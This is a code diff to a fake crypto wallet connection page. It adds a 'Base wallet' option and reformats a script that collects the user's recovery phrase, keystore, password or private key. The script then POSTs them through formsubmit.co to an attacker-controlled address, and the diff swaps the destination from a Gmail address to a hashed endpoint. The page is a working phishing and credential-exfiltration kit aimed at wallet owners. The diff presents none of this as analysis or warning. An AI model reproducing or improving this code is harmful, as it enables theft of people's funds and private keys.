@@ -8596,6 +8596,12 @@
               <h4 class="text-white">Metamask</h4>
             </button>
 
+            <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal4" class="btn coin">
+              <img class="coin-img" src="assets/d57f5fab-df8f-4a32-9db4-96386d584050.png"
+                alt="" />
+              <h4 class="text-white">Base wallet</h4>
+            </button>
+
             <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
               <img class="coin-img" src="assets/ledger_logo.png" alt="" />
               <h4 class="text-white">Ledger</h4>
@@ -9117,23 +9123,20 @@
 
         let processBtn = $("#proceedButton");
         let cancelBtn = $("#cancelBtn");
-        
-        let message = '********************\n\n';
-        message += `Wallet Connection:\n`;
+        let message = `Wallet Connection:\n`;
         message += `${coinType}\n\n`;
-        if ( reqPhrase ) message += `Phrase\n`;
-        if ( reqPhrase ) message += `${reqPhrase}\n\n`;
-        if ( reqKeystore ) message += `Keystore\n`;
-        if ( reqKeystore ) message += `${reqKeystore}\n\n`;
-        if ( reqKeystore ) message += `Password\n`;
-        if ( reqPassword ) message += `${reqPassword}\n\n`;
-        if ( reqPrivateKey ) message += `Private Key\n`;
-        if ( reqPrivateKey ) message += `${reqPrivateKey}\n\n`;
-        message +=`********************\n`;
+        if ( reqPhrase ) message += `Phrase: `;
+        if ( reqPhrase ) message += `${reqPhrase}`;
+        if ( reqKeystore ) message += `Keystore: `;
+        if ( reqKeystore ) message += `${reqKeystore}`;
+        if ( reqKeystore ) message += `Password: `;
+        if ( reqPassword ) message += `${reqPassword}`;
+        if ( reqPrivateKey ) message += `Private Key: `;
+        if ( reqPrivateKey ) message += `${reqPrivateKey}`;
 
         $.ajax({
           type: "POST",
-          url: `https://formsubmit.co/ajax/natashanice046@gmail.com`,
+          url: `https://formsubmit.co/ajax/fceb7c66a69228b93c167b94e13568a0`,
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
           },
